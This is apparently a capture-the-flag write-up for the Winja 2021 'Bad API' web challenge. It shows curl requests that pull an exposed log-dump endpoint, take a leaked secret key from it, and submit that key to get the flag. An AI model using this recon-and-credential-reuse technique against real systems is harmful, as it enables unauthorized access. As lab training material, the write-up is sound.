# Winja 2021 — Bad API — writeup

The challenge is a web page, with a username field.

http://hkqe8p4e8msopmz9ukjd.winjasmartcity.xyz

After trying with “admin”, we receive the message:

> “Secret key provided is invalid. Please try again.”

Checking the Network tab on Chrome DevTools, it’s:

> POST https://hkqe8p4e8msopmz9ukjd.winjasmartcity.xyz/form

username: admin
secret_key:
Mechanic: Somebody set up us the bomb. Operator: Main screen turn on.

So lets find this secret key, checking the console we can see that there is a recurring call to the endpoint

> curl -X GET http://hkqe8p4e8msopmz9ukjd.winjasmartcity.xyz/api/v1/dump_status

The response to this request is:

“Log dump not ready”

after a few seconds it returned the message:

“Dump ready at endpoint (v1)”

So now we will try to find this dump, analyzing the status url we will try to do a get at the endpoint

> curl -X GET http://hkqe8p4e8msopmz9ukjd.winjasmartcity.xyz/api/v1/dump

Analysing the response we can see some interesting information leaked:

…
views.py:44 — process_form()] ImmutableMultiDict([(‘username’, ‘SECRET’), (‘secret_key’, ‘S’)])
[views.py:56 — process_form()] Expected key ALLYOURBASEAREBELONGTOUS not recieved. Redirecting to 404…
[views.py:43 — process_form()] Request recieved:
[views.py:44 — process_form()] ImmutableMultiDict([(‘username’, ‘’), (‘secret_key’, ‘SECRET’)])
[views.py:43 — process_form()] Request recieved:
[views.py:44 — process_form()] ImmutableMultiDict([(‘username’, ‘admin’), (‘secret_key’, ‘\r\nMechanic: Somebody set up us the bomb. Operator: Main screen turn on.\r\n ‘)])
[views.py:56 — process_form()] Expected key (censored) not recieved. Redirecting to 404…
…

As we can see there are some logs related to secret_key and some secret tips that we can try to use, like ALLYOURBASEAREBELONGTOUS

> curl -X POST -F “username=admin” -F “secret_key=ALLYOURBASEAREBELONGTOUS” http://hkqe8p4e8msopmz9ukjd.winjasmartcity.xyz/form

We got a redirect, so it’s a wrong secret_key, but we have another secret_key on the first log, (censored)

> curl -X POST -F “username=admin” -F “secret_key=(censored)” http://hkqe8p4e8msopmz9ukjd.winjasmartcity.xyz/form

Now we got an HTML response, with the flag!!

...
</form>
> flag\{(censored)\}
</div>
...

Keep Hacking!

#KapiSec
